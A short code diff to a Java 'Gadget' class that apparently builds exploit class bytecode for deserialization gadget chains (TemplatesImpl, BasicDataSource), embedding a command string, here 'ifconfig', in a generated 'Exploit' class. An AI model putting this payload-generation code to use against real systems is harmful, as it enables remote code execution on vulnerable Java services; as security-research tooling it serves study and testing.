@@ -108,7 +108,6 @@ public class Gadget {
             code = String.format("{%s}",code);
             ctConstructor.setBody(code);
             clazz.setName("Exploit");
-            System.out.println(clazz.toString());
             final byte[] classBytes = clazz.toBytecode();
             return classBytes;
         }catch (Exception e){
@@ -134,6 +133,7 @@ public class Gadget {
             ci.setBody(code);
 
             clazz.setName("Exploit");
+//            clazz.writeFile("test");
             final byte[] classBytes = clazz.toBytecode();
             return classBytes;
         }catch (Exception e){
@@ -143,6 +143,6 @@ public class Gadget {
     }
 
     public static void main(String[] args) {
-        Gadget.getTemplatesImpl2ExpCode("ifconfig");
+        Gadget.getBasicDataSource1ExpCode("ifconfig");
     }
 }
